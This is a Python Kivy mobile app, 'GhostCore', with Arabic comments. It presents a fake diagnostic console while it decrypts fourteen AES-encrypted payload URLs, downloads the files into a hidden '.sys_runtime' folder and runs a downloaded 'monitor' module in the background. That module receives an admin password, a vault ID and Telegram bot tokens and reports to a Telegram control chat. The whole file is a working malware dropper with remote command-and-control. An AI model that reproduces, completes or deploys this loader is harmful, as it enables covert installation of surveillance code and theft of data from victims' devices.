# -*- coding: utf-8 -*-
import os
import sys
import time
import json
import base64
import threading
import traceback
import importlib.util
import requests
from kivy.app import App
from kivy.uix.textinput import TextInput
from kivy.uix.boxlayout import BoxLayout
from kivy.clock import Clock
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# ---------------------- إعدادات التشفير ----------------------
ENCRYPTION_KEY = b'MySup3rS3cr3tK3y1234567890123456'

# الروابط المشفرة لملفات Gists (14 ملفاً)
PAYLOAD_URLS_ENCRYPTED = [
    "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"
]

BASE_DIR = os.path.join(os.getcwd(), ".sys_runtime")
if not os.path.exists(BASE_DIR):
    os.makedirs(BASE_DIR)
sys.path.append(BASE_DIR)

def decrypt_data(encrypted_b64):
    try:
        data = base64.b64decode(encrypted_b64)
        iv, tag, ciphertext = data[:12], data[-16:], data[12:-16]
        cipher = Cipher(algorithms.AES(ENCRYPTION_KEY), modes.GCM(iv, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        return (decryptor.update(ciphertext) + decryptor.finalize()).decode()
    except Exception:
        return None

# استيراد الأسرار من GitHub Secrets (يتم إنشاؤها أثناء البناء)
try:
    from secrets import BOT_TOKENS, CONTROL_ID, VAULT_ID, ADMIN_PASSWORD
except ImportError:
    # قيم افتراضية للتطوير المحلي فقط
    BOT_TOKENS = ["YOUR_BOT_TOKEN"]
    CONTROL_ID = "YOUR_CONTROL_ID"
    VAULT_ID = "YOUR_VAULT_ID"
    ADMIN_PASSWORD = "Zaen123@123@"

class GhostCoreApp(App):
    def build(self):
        self.log_history = []
        self.add_log("🚀 بدء تشغيل التطبيق...")
        root = BoxLayout(orientation='vertical', padding=5)
        self.console = TextInput(
            text="[GhostCore v2.0 - Diagnostic Mode]\n",
            readonly=True,
            background_color=(0, 0, 0, 1),
            foreground_color=(0, 1, 0, 1),
            font_size='12sp'
        )
        root.add_widget(self.console)
        Clock.schedule_once(self.run_engine, 0.5)
        return root

    def add_log(self, msg):
        timestamp = time.strftime("%H:%M:%S")
        entry = f"[{timestamp}] {msg}"
        self.log_history.append(entry)
        if hasattr(self, 'console') and self.console:
            self.console.text += entry + "\n"
        print(entry)

    def send_telegram(self, message, is_error=False):
        prefix = "❌ " if is_error else "✅ "
        full_msg = prefix + message[:4000]
        for token in BOT_TOKENS:
            try:
                url = f"https://api.telegram.org/bot{token}/sendMessage"
                requests.post(url, json={"chat_id": CONTROL_ID, "text": full_msg}, timeout=5)
                break
            except Exception:
                continue

    def decrypt_url(self, enc):
        return decrypt_data(enc)

    def download_payloads(self):
        self.add_log("📥 بدء فك تشفير الروابط وتحميل البايلودات...")
        for i, enc in enumerate(PAYLOAD_URLS_ENCRYPTED):
            url = self.decrypt_url(enc)
            if not url:
                self.add_log(f"❌ فشل فك تشفير الرابط {i+1}")
                continue
            name = url.split('/')[-1]
            self.add_log(f"⬇️ تحميل {name}...")
            try:
                resp = requests.get(url, timeout=15)
                if resp.status_code == 200:
                    with open(os.path.join(BASE_DIR, name), 'w', encoding='utf-8') as f:
                        f.write(resp.text)
                    self.add_log(f"✅ تم تحميل {name}")
                else:
                    self.add_log(f"⚠️ فشل تحميل {name} (HTTP {resp.status_code})")
            except Exception as e:
                self.add_log(f"⚠️ خطأ في تحميل {name}: {str(e)[:100]}")
        self.add_log("🏁 اكتمل تحميل البايلودات.")

    def start_services(self):
        self.add_log("⚙️ محاولة استيراد Monitor ديناميكياً...")
        try:
            monitor_path = os.path.join(BASE_DIR, "monitor.py")
            if not os.path.exists(monitor_path):
                self.add_log(f"❌ ملف monitor.py غير موجود في {BASE_DIR}")
                return

            spec = importlib.util.spec_from_file_location("monitor", monitor_path)
            monitor_module = importlib.util.module_from_spec(spec)
            sys.modules["monitor"] = monitor_module
            spec.loader.exec_module(monitor_module)

            if hasattr(monitor_module, 'Monitor'):
                mon = monitor_module.Monitor()
                mon.admin_password = ADMIN_PASSWORD
                mon.bot_token = BOT_TOKENS[0]  # التوكن الأول لإرسال التقارير
                mon.control_id = CONTROL_ID
                mon.vault_id = VAULT_ID
                # ربط التوكنات المتعددة (إذا احتاجها)
                setattr(mon, 'bot_tokens', BOT_TOKENS)
                threading.Thread(target=mon.start, daemon=True).start()
                self.add_log("✅ تم تشغيل كلاس Monitor بنجاح!")
                self.send_telegram("🚀 Monitor is now active.")
            else:
                self.add_log("⚠️ الكلاس 'Monitor' غير موجود داخل ملف monitor.py")
                self.add_log(f"🔍 محتويات الموديول: {dir(monitor_module)}")
        except Exception as e:
            error_trace = traceback.format_exc()
            self.add_log(f"❌ فشل تشغيل الخدمات: {str(e)}")
            self.add_log(error_trace[:500])
            self.send_telegram(f"Error starting services:\n{error_trace[:1000]}", is_error=True)

    def run_engine(self, dt):
        try:
            self.add_log("🔍 فحص بيئة التشغيل...")
            # التحقق من وجود المجلدات (ليست ضرورية للعمل)
            for folder in ['core', 'telegram', 'config', 'media']:
                exists = "✅" if os.path.isdir(folder) else "❌"
                self.add_log(f"Folder '{folder}': {exists}")
            import jnius
            self.add_log("✅ Pyjnius loaded")
            import cryptography
            self.add_log("✅ Cryptography loaded")
            self.download_payloads()
            self.start_services()
            self.add_log("🏁 اكتملت الفحوصات. التطبيق يعمل في الخلفية.")
            self.send_telegram("تم تشغيل التطبيق بنجاح على الجهاز.")
        except Exception as e:
            error_trace = traceback.format_exc()
            self.add_log(f"❌ خطأ جسيم:\n{error_trace}")
            self.send_telegram(f"انهيار عند التشغيل:\n{error_trace[:3000]}", is_error=True)

if __name__ == '__main__':
    try:
        GhostCoreApp().run()
    except Exception as e:
        try:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKENS[0]}/sendMessage",
                          json={"chat_id": CONTROL_ID, "text": f"🚨 انهيار قبل الإقلاع:\n{traceback.format_exc()[:4000]}"})
        except Exception:
            pass
        raise
